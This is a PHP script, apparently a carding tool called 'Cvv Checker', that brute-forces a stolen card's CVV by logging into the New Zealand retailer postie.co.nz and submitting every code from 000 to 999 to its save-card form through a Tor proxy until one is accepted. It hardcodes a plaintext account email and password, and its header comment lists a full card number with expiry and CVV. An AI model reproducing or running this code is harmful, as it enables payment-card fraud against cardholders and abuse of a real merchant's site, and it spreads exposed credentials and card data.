<?php 
/*
	C0ded by mose3c 
	This script is pri9vet pleas don't share

Faild
Oops, something has gone wrong.
The transaction was not approved 
The transaction was not approved yt


Success 
Credit card saved successfully
5547356170237361|01|21|000
*/



error_reporting(0);
echo @shell_exec("clear");
_logo();

$cards_file = $argv[1]; // cvv file 
$card = explode("|", $cards_file);
$cc_number = $card[0]; 
$cc_month = $card[1]; 
$cc_year = $card[2];

if(strlen($cc_year) >= 4) $cc_year = substr($cc_year, 2,4);


#proxy for ip rotation
$proxy_ip   = "127.0.0.1";
$proxy_port = 9050;
$proxy 	    = $proxy_ip.":".$proxy_port;

$maxcvv = 999; # maximum cvv number to check

for($i=0;$i<=$maxcvv;$i++)
{
	if($i<10)
	{
		$cvv = "00$i";
	}
	else if($i>=10 && $i <= 99)
	{
		$cvv = "0$i";
	}
	else
	{
		$cvv = $i;
	}

	$cc_detail 		  =  "$cc_number|$cc_month|$cc_year|$cvv";
	$login 			  = login($proxy);
	$checkcard_status = checkcard_status($proxy,"$cc_number","$cc_month","$cc_year","$cvv");



	if(strstr($checkcard_status , "Oops, something has gone wrong.")) # faild
	{
		$message = "\e[33m$cc_detail PROXY DEAD\e[0m";
	}
	else if(strstr($checkcard_status , "The transaction was not approved")) # faild
	{
		$message = "\e[31m$cc_detail DEAD\e[0m";
	}
	else if(strstr($checkcard_status , "The transaction was not approved yt")) # faild
	{
		$message = "\e[31m$cc_detail DEAD\e[0m";
	}
	else if(strstr($checkcard_status , 'Credit card saved successfully')) # success
	{
		
		print("\e[32m$cc_detail LIVE\e[0m\n");
		break;
	}		
	else # faild
	{
		$message = "\e[34m$cc_detail UNKOWN ERROR PLEASE CONTACT DEVELOPER.\e[0m";
	}

	print("$message\n");
	//sleep(4);

}



function login($proxy)
{	
	$postdata =  "email=coders.village%40gmail.com&password=Abohussein1998%40";
	$content_length = strlen($postdata);
	$headers = array();
	$headers[] = "Host: www.postie.co.nz";
	$headers[] = "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0";
	$headers[] = "Accept: */*";
	$headers[] = "Accept-Language: en-US,en;q=0.5";
	$headers[] = "Referer: https://www.postie.co.nz/";
	$headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
	$headers[] = "X-Requested-With: XMLHttpRequest";
	$headers[] = "Content-Length: $content_length";
	$headers[] = "Connection: close";

	$url   = "https://www.postie.co.nz/login";
	$ch_s  = curl_init();
	curl_setopt($ch_s, CURLOPT_URL, $url);
	curl_setopt($ch_s, CURLOPT_PROXY, $proxy);
	curl_setopt($ch_s, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
	curl_setopt($ch_s, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch_s, CURLOPT_SSL_VERIFYHOST,  false);
    curl_setopt($ch_s, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch_s, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch_s, CURLOPT_HEADER, true);
    curl_setopt($ch_s, CURLOPT_COOKIEFILE, 'cookie.txt');  // Enables session support
	curl_setopt($ch_s, CURLOPT_COOKIEJAR, "cookie.txt"); 
	#curl_setopt($ch_s, CURLOPT_VERBOSE, true);
	curl_setopt($ch_s, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch_s, CURLOPT_POSTFIELDS, $postdata);
	$result 	  = curl_exec($ch_s);
	file_put_contents("login.html", $result);
	return $result;
}



function checkcard_status($proxy,$cc_number,$cc_month,$cc_year,$cc_ccv)
{	
	$postdata  =  "CardHolderName=john+smith&CardNumber=$cc_number&ExpiryMonth=$cc_month&ExpiryYear=$cc_year&Cvc2=$cc_ccv";

	$url   = "https://www.postie.co.nz/my-details?f=savecard";
	$ch_s  = curl_init();
	curl_setopt($ch_s, CURLOPT_URL, $url);
	curl_setopt($ch_s, CURLOPT_PROXY, $proxy);
	curl_setopt($ch_s, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
	curl_setopt($ch_s, CURLOPT_SSL_VERIFYHOST,  false);
    curl_setopt($ch_s, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch_s, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch_s, CURLOPT_HEADER, true);
    curl_setopt($ch_s, CURLOPT_COOKIEFILE, 'cookie.txt');  // Enables session support
	#curl_setopt($ch_s, CURLOPT_VERBOSE, true);
	#curl_setopt($ch_s, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($ch_s, CURLOPT_POSTFIELDS, $postdata);
	$result 	  = curl_exec($ch_s);
	file_put_contents("index.html", $result);
	return $result;
}



function _logo()
{
 print "\n
\t\e[36mCvv Checker V 6.2 C0ded By Mose3c.\n\e[35;1m
\t\t    /\_/\
\t\t  =( °w° )=
\t\t    )	(
\t\t   (_____)\n\n\n	
 \e[22m\e[33mpalestine number \e[33mONE\e[0m\n
 Usage: php $argv[0] cvvfile livefile\n
 \e[55m\e[32mFb: https://www.facebook.com/anonsecps\e[0m
\n\n\n
";

}

?>